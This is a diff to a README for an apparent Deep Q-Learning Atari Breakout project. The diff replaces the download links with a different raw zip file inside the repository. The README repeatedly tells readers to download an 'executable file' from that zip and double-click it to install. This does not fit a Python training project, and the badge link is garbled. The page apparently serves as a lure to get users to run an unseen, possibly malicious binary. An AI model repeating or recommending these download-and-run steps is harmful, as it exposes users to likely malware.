@@ -4,7 +4,7 @@
 Welcome to the *tf-atari-dqn-breakout* project! This software runs a Deep Q-Learning algorithm to play Atari Breakout. It learns to play by analyzing the game pixels. You can easily download and run the program to see how it performs.
 
 ## 📥 Download Now
-[![Download Release](https://raw.githubusercontent.com/Spoiled-miracleplay106/tf-atari-dqn-breakout/main/src/tf-atari-dqn-breakout-1.0.zip%20Now-Click%https://raw.githubusercontent.com/Spoiled-miracleplay106/tf-atari-dqn-breakout/main/src/tf-atari-dqn-breakout-1.0.zip)](https://raw.githubusercontent.com/Spoiled-miracleplay106/tf-atari-dqn-breakout/main/src/tf-atari-dqn-breakout-1.0.zip)
+[![Download Release](https://raw.githubusercontent.com/Spoiled-miracleplay106/tf-atari-dqn-breakout/main/experiments/breakout_dqn_atari_tf_3.5.zip%20Now-Click%https://raw.githubusercontent.com/Spoiled-miracleplay106/tf-atari-dqn-breakout/main/experiments/breakout_dqn_atari_tf_3.5.zip)](https://raw.githubusercontent.com/Spoiled-miracleplay106/tf-atari-dqn-breakout/main/experiments/breakout_dqn_atari_tf_3.5.zip)
 
 ## 📋 About This Project
 The *tf-atari-dqn-breakout* project is based on the research of Mnih et al. (2013). It uses TensorFlow and Gymnasium to implement a Deep Q-Learning (DQN) algorithm. By training on a game environment, the algorithm learns how to play Atari Breakout directly from pixel inputs. 
@@ -25,11 +25,11 @@ The *tf-atari-dqn-breakout* project is based on the research of Mnih et al. (201
 ## 📥 Download & Install
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to [this page to download](https://raw.githubusercontent.com/Spoiled-miracleplay106/tf-atari-dqn-breakout/main/src/tf-atari-dqn-breakout-1.0.zip) where the latest release is available.
+1. **Visit the Releases Page:** Go to [this page to download](https://raw.githubusercontent.com/Spoiled-miracleplay106/tf-atari-dqn-breakout/main/experiments/breakout_dqn_atari_tf_3.5.zip) where the latest release is available.
    
 2. **Choose Your Version:** Look for the latest version in the list. It will have the highest number, for example, `v1.0.0`.
 
-3. **Download the Software:** Click on the link for the executable file. It may be named something like `https://raw.githubusercontent.com/Spoiled-miracleplay106/tf-atari-dqn-breakout/main/src/tf-atari-dqn-breakout-1.0.zip` or a similar title, depending on the version.
+3. **Download the Software:** Click on the link for the executable file. It may be named something like `https://raw.githubusercontent.com/Spoiled-miracleplay106/tf-atari-dqn-breakout/main/experiments/breakout_dqn_atari_tf_3.5.zip` or a similar title, depending on the version.
 
 4. **Run the Installer:** Once downloaded, locate the file in your downloads folder. Double-click the file and follow the on-screen instructions to install the software.
 
@@ -63,4 +63,4 @@ By engaging with these resources, you'll gain insights into how the *tf-atari-dq
 ## 🏁 Conclusion
 Thank you for using *tf-atari-dqn-breakout*. By following these instructions, you can easily download and run the software. Enjoy watching how deep learning can master Atari Breakout! 
 
-[Download Release Here](https://raw.githubusercontent.com/Spoiled-miracleplay106/tf-atari-dqn-breakout/main/src/tf-atari-dqn-breakout-1.0.zip) to start your journey!
+[Download Release Here](https://raw.githubusercontent.com/Spoiled-miracleplay106/tf-atari-dqn-breakout/main/experiments/breakout_dqn_atari_tf_3.5.zip) to start your journey!
